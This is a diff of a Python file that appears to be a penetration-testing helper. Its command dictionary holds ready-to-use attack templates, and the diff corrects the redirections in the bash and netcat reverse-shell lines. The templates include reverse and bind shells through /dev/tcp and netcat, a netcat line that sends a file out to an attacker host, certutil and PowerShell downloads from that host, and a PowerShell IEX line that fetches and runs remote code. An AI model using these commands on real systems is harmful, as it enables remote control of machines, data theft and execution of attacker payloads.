@@ -6,13 +6,13 @@ import os
 import re
 
 Commands = {
-    "bash"       : "bash -i >& /dev/tcp/$LHOST/$LPORT 2>&1",
+    "bash"       : "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1",
     "certutil"   : "certutil -urlcache -split -f http://$LHOST/$FILE",
     "http"       : "http://$LHOST/$FILE",
     "msfvenom"   : "msfvenom LHOST=$LHOST LPORT=$LPORT",
     "nc-file"    : "nc -w 3 $LHOST $LPORT < $FILE",
     "nc-b"       : "mkfifo /tmp/f; nc -lvnp $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/",
-    "nc-r"       : "mkfifo /tmp/f; nc $LHOST $LPORT < /tmp/f | /bin/bash >/tmp/f 3>&1; rm /tmp/f",
+    "nc-r"       : "mkfifo /tmp/f; nc $LHOST $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/f",
     "ps-dl"      : "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://$LHOST:80/$FILE','$FILE')\"",
     "ps-ex"      : "powershell \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:80/$FILE')\"",
     "ps-wget"    : "wget -OutFile $FILE http://$LHOST/$FILE",
